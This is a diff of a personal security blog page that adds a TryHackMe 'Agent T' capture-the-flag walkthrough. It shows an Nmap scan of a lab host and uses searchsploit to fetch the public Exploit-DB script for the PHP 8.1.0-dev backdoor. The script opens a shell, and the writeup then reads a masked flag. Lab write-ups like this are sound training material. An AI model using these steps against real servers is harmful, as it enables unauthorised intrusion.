@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TryHackMe Rooms | Bisc's Security Lab</title>
+    <title>Agent T Writeup | Bisc's Security Lab</title>
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -161,94 +161,78 @@
             text-decoration: underline;
         }
 
-        .page-header {
-            margin-bottom: 2rem;
+        .article {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 2rem;
         }
 
-        .page-header h1 {
+        .article-meta {
+            display: flex;
+            gap: 0.8rem;
+            margin-bottom: 1rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+        }
+
+        .tag {
+            background: rgba(0, 229, 255, 0.1);
+            color: var(--accent-cyan);
+            padding: 2px 8px;
+            border-radius: 4px;
+            border: 1px solid rgba(0, 229, 255, 0.2);
+        }
+
+        .article h1 {
             color: #fff;
             font-size: 1.8rem;
-            margin-bottom: 0.5rem;
+            margin-bottom: 1rem;
         }
 
-        .page-header p {
-            color: var(--text-muted);
+        .article h2 {
+            color: var(--accent-green);
+            font-family: 'Fira Code', monospace;
+            font-size: 1.1rem;
+            margin: 1.8rem 0 0.8rem 0;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 0.3rem;
+        }
+
+        .article p, .article ul {
+            margin-bottom: 1rem;
+            color: var(--text-main);
             font-size: 0.95rem;
         }
 
-        .rooms-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(210px, 1fr));
-            gap: 0.8rem;
+        .article ul {
+            padding-left: 1.2rem;
         }
 
-        .room-card {
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            padding: 0.8rem 1rem;
-            text-decoration: none;
-            color: var(--text-main);
-            transition: all 0.2s ease;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            min-height: 85px;
-        }
-
-        .room-card:hover {
-            border-color: var(--accent-green);
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0, 255, 136, 0.15);
-        }
-
-        .room-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+        .article li {
             margin-bottom: 0.4rem;
         }
 
-        .room-title {
-            color: #fff;
+        pre {
+            background: var(--code-bg);
+            border: 1px solid var(--border-color);
+            border-left: 3px solid var(--accent-green);
+            border-radius: 6px;
+            padding: 1rem;
+            overflow-x: auto;
             font-family: 'Fira Code', monospace;
-            font-size: 0.95rem;
-            font-weight: 600;
+            font-size: 0.85rem;
+            color: #e6edf3;
+            margin: 1rem 0;
         }
 
-        .badge-easy {
+        code {
             font-family: 'Fira Code', monospace;
-            font-size: 0.65rem;
-            color: var(--accent-green);
-            background: rgba(0, 255, 136, 0.1);
-            padding: 1px 6px;
-            border-radius: 3px;
-            border: 1px solid rgba(0, 255, 136, 0.2);
-        }
-
-        .badge-medium {
-            font-family: 'Fira Code', monospace;
-            font-size: 0.65rem;
-            color: #ffb703;
-            background: rgba(255, 183, 3, 0.1);
-            padding: 1px 6px;
-            border-radius: 3px;
-            border: 1px solid rgba(255, 183, 3, 0.2);
-        }
-
-        .badge-hard {
-            font-family: 'Fira Code', monospace;
-            font-size: 0.65rem;
-            color: #ff0055;
-            background: rgba(255, 0, 85, 0.1);
-            padding: 1px 6px;
-            border-radius: 3px;
-            border: 1px solid rgba(255, 0, 85, 0.2);
-        }
-
-        .room-tag {
-            font-size: 0.75rem;
-            color: var(--text-muted);
+            color: var(--accent-cyan);
+            background: rgba(255, 255, 255, 0.05);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.85rem;
         }
 
         @media (max-width: 768px) {
@@ -262,16 +246,16 @@
 
     <aside class="sidebar">
         <div class="avatar-container">
-            <img src="../../avatar.jpeg" alt="Bisc Profile Picture" class="avatar">
+            <img src="../../../avatar.jpeg" alt="Bisc Profile Picture" class="avatar">
         </div>
         <h2 class="profile-name">Bisc</h2>
         <p class="profile-rank">[0x6][VOYAGER]</p>
         <p class="profile-bio">I love biscuits 🙃🍪</p>
 
         <nav class="nav-links">
-            <a href="../../index.html" class="nav-btn">~/home</a>
-            <a href="../index.html" class="nav-btn active">~/ctf</a>
-            <a href="../../about/index.html" class="nav-btn">~/about</a>
+            <a href="../../../index.html" class="nav-btn">~/home</a>
+            <a href="../../index.html" class="nav-btn active">~/ctf</a>
+            <a href="../../../about/index.html" class="nav-btn">~/about</a>
         </nav>
 
         <div class="social-links">
@@ -281,36 +265,74 @@
 
     <main class="main-content">
         <div class="breadcrumbs">
-            <a href="../../index.html">home</a> / <a href="../index.html">ctf</a> / <span style="color: var(--text-main);">tryhackme</span>
+            <a href="../../../index.html">home</a> / <a href="../../index.html">ctf</a> / <a href="../index.html">tryhackme</a> / <span style="color: var(--text-main);">Agent-T</span>
         </div>
 
-        <div class="page-header">
-            <h1>// TryHackMe Rooms</h1>
-            <p>Collection of completed rooms, web exploits, and machine walkthroughs.</p>
-        </div>
+        <article class="article">
+            <div class="article-meta">
+                <span class="tag">TryHackMe</span>
+                <span class="tag">PHP 8.1.0-dev</span>
+                <span class="tag">RCE</span>
+                <span class="tag">Easy</span>
+            </div>
 
-        <div class="rooms-grid">
-            
-            <a href="Agent-T/index.html" class="room-card">
-                <div class="room-header">
-                    <span class="room-title">Agent T</span>
-                    <span class="badge-easy">Easy</span>
-                </div>
-                <div class="room-tag">PHP 8.1.0-dev RCE</div>
-            </a>
+            <h1>Agent T — Room Walkthrough</h1>
+            <p>Agent T is an easy TryHackMe machine that highlights initial web service enumeration and remote code execution via an intentional backdoor present in PHP 8.1.0-dev.</p>
 
-            <!-- To add a new room cards easily like this in the future: -->
-            <!-- 
-            <a href="/ctf/tryhackme/RoomName/" class="room-card">
-                <div class="room-header">
-                    <span class="room-title">Room Name</span>
-                    <span class="badge-easy">Easy</span>
-                </div>
-                <div class="room-tag">Exploit Type</div>
-            </a>
-            -->
+            <h2>01. Reconnaissance & Enumeration</h2>
+            <p>Searching through the website directly and intercepting traffic in Burp Suite did not reveal vulnerable functional endpoints. An initial Nmap service scan was run against the target IP address:</p>
 
-        </div>
+<pre><code>┌──(kali㉿kali)-[~]
+ └─$ nmap -A -sC 10.113.132.144
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-15 08:07 -0400
+Nmap scan report for 10.113.132.144
+Host is up (0.063s latency).
+PORT   STATE SERVICE VERSION
+80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
+|_http-title: Admin Dashboard
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+            <p>The scan shows HTTP open on port 80 running <code>PHP 8.1.0-dev</code>. This target version contains a public backdoor vulnerability permitting arbitrary command execution.</p>
+
+            <h2>02. Exploitation</h2>
+            <p>I searched for the exploit script using <code>searchsploit</code> but you can also search it from Exploit-DB:</p>
+<pre><code>searchsploit PHP 8.1.0-dev
+
+  # In the output
+  PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution        | php/webapps/49933.py
+</code></pre>
+
+            <p>The exploit script can be obtained using <code>searchsploit</code> or directly downloaded from Exploit-DB:</p>
+
+<pre><code>searchsploit -m php/webapps/49933.py</code></pre>
+
+            <p>Executing the Python script we've got against the web URL, it will give us an interactive shell session:</p>
+
+<pre><code>python 49933.py
+# Target URL: http://10.113.132.144/
+# Interactive shell is opened on http://10.113.132.144/
+# Can't access tty; job control turned off.</code></pre>
+
+            <h2>03. Flag Retrieval</h2>
+            <p>Checking the current working directory:</p>
+
+<pre><code>$ pwd
+/var/www/html</code></pre>
+
+            <p>Navigating three steps backward to the root directory (<code>/</code>) and listing its contents:</p>
+
+<pre><code>$ cd ../../../ && ls
+bin   dev  home  media  opt   root  sbin  sys  usr
+boot  etc  lib   mnt    proc  run   srv   tmp  var
+flag.txt  lib64</code></pre>
+
+            <p>Reading <code>flag.txt</code> at the root path completes the challenge:</p>
+
+<pre><code>$ cat flag.txt
+
+flag{412***************************cb}
+</code></pre>
+        </article>
     </main>
 
 </body>
